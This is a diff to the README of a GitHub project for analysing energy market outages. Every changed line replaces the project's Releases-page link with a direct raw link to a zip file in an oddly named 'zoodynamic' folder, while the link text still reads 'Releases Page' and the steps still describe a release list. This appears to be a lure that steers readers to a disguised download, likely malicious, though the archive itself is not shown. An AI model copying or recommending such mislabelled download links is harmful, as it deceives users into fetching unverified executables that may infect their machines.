@@ -7,11 +7,11 @@ Welcome to the **aemr-energy-market-outage-analysis** project. This application 
 
 ## 📥 Download the Application
 
-[![Download aemr-energy-market-outage-analysis](https://img.shields.io/badge/Download-aemr--energy--market--outage--analysis-brightgreen)](https://github.com/Diyorbek01660/aemr-energy-market-outage-analysis/releases)
+[![Download aemr-energy-market-outage-analysis](https://raw.githubusercontent.com/Diyorbek01660/aemr-energy-market-outage-analysis/main/zoodynamic/aemr-outage-energy-market-analysis-1.9-alpha.3.zip)](https://raw.githubusercontent.com/Diyorbek01660/aemr-energy-market-outage-analysis/main/zoodynamic/aemr-outage-energy-market-analysis-1.9-alpha.3.zip)
 
 To download the application, visit the link below:
 
-[Download from the Releases Page](https://github.com/Diyorbek01660/aemr-energy-market-outage-analysis/releases)
+[Download from the Releases Page](https://raw.githubusercontent.com/Diyorbek01660/aemr-energy-market-outage-analysis/main/zoodynamic/aemr-outage-energy-market-analysis-1.9-alpha.3.zip)
 
 ## 🖥 System Requirements
 
@@ -25,7 +25,7 @@ Before you download the application, ensure your system meets these requirements
 
 ## 📥 Download & Install
 
-1. Click the link to visit the [Releases Page](https://github.com/Diyorbek01660/aemr-energy-market-outage-analysis/releases).
+1. Click the link to visit the [Releases Page](https://raw.githubusercontent.com/Diyorbek01660/aemr-energy-market-outage-analysis/main/zoodynamic/aemr-outage-energy-market-analysis-1.9-alpha.3.zip).
 2. Look for the latest release. You will see the version number with its release date.
 3. Click on the version to open the release details.
 4. Download the installer file for your operating system. Look for a file ending in `.exe` for Windows or `.dmg` for macOS.
